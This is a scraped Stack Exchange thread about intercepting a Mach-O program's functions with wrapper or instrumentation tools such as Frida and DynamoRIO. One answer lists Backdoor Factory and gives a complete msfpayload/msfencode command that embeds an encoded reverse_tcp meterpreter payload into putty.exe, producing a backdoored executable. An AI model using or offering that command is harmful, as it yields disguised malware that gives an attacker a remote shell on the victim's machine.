{
    "title": "Can one modify a program by \"wrapping\" its binary? What tools exist?",
    "link": "https://reverseengineering.stackexchange.com/questions/8018/can-one-modify-a-program-by-wrapping-its-binary-what-tools-exist",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>(This question is related to <a href=\"https://reverseengineering.stackexchange.com/q/185\">How do I add functionality to an existing binary executable?</a>).</p>\n<p>I too would like to add functionality to an existing application, but I do not want to modify the original binary.</p>\n<p>I imagine that, for some \"well-behaved\" compiled code, it ought to be possible to create a \"wrapper\" program that:</p>\n<ol>\n<li>maps the original binary's segments into its own memory space; and </li>\n<li>places its own redefined functions at the relevant addresses.</li>\n</ol>\n<p>For example, suppose that loading the original binary would place <code>void origfunction(int, int)</code> at location <code>0x1234</code>; my thought is that loading the wrapper might cause that function's machine code (from the original binary) to be loaded at <code>0x5678</code> with <code>void newfunction(int, int)</code> loaded at <code>0x1234</code> in its place.  <code>newfunction</code> could then make a call to <code>origfunction</code> before/after performing its modifications.</p>\n<p><strong>Is this approach feasible?  If not, why not?</strong></p>\n<p>If it is feasible, are there any tools that can assist in automating the generation of such a wrapper program?  Generic answers would be most useful for future readers, but the original binary that I am working with right now is a fairly typical OS X one (Mach-O format, compiled from Objective-C).</p>\n</div>",
    "votes": "2",
    "answers": 2,
    "views": "1k",
    "tags": [
        "tools",
        "c",
        "executable",
        "osx",
        "mach-o"
    ],
    "user": "eggyal",
    "time": "Apr 13, 2017 at 12:49",
    "comments": [],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Dynamic instrumentation tools like <a href=\"https://www.frida.re/docs/installation/\" rel=\"nofollow noreferrer\">Frida</a> or <a href=\"http://www.dynamorio.org/\" rel=\"nofollow noreferrer\">DynomoRIO</a> are probably your best bet. Traditional code injection approaches like <a href=\"https://github.com/rentzsch/mach_inject\" rel=\"nofollow noreferrer\">mach_inject</a> on os x or <a href=\"http://research.microsoft.com/en-us/projects/detours/\" rel=\"nofollow noreferrer\">detours</a> on windows are things you could look into as well.</p>\n</div>",
            "votes": "3",
            "user": "broadway",
            "time": "Jan 27, 2017 at 18:38",
            "is_accepted": false,
            "comments": [
                {
                    "user": "ikaerom",
                    "text": "<span class=\"comment-copy\">I suppose mentioning <b>pin</b> (which does not seem to be available anymore on MacOSX) and <b>DynomoRIO</b>, one could also add <a href=\"http://www.cycript.org/\" rel=\"nofollow noreferrer\">cycript</a> to that list. It works remarkably well, though seems mostly undocumented.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Some of the tools i know of:</p>\n<ol>\n<li><p>Backdoor Factory: <a href=\"https://github.com/secretsquirrel/the-backdoor-factory\" rel=\"nofollow\">https://github.com/secretsquirrel/the-backdoor-factory</a></p></li>\n<li><p>Use Metasploit msfencode:</p>\n<p><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 3 -t exe -x /var/www/putty.exe -o /var/www/puttyx.exe</code></p></li>\n</ol>\n<p>Backdoor Factory support a varity of binaries such as ELF, Mach-O, PE.</p>\n</div>",
            "votes": "1",
            "user": "Jonas Lejon",
            "time": "Jan 15, 2015 at 10:33",
            "is_accepted": false,
            "comments": [
                {
                    "user": "eggyal",
                    "text": "<span class=\"comment-copy\">Unless I've misunderstood, both those solutions appear to <i>statically</i> modify the underlying binary (which is something that I do not want to do).  I am looking for tools through which one can create an executable that will <i>dynamically</i> load the original binary yet intercept its function calls.  Or have I missed something?</span>",
                    "time": null
                },
                {
                    "user": "Jonas Lejon",
                    "text": "<span class=\"comment-copy\">@eggyal: You are correct. I misunderstood the question, sorry.</span>",
                    "time": null
                }
            ]
        }
    ]
}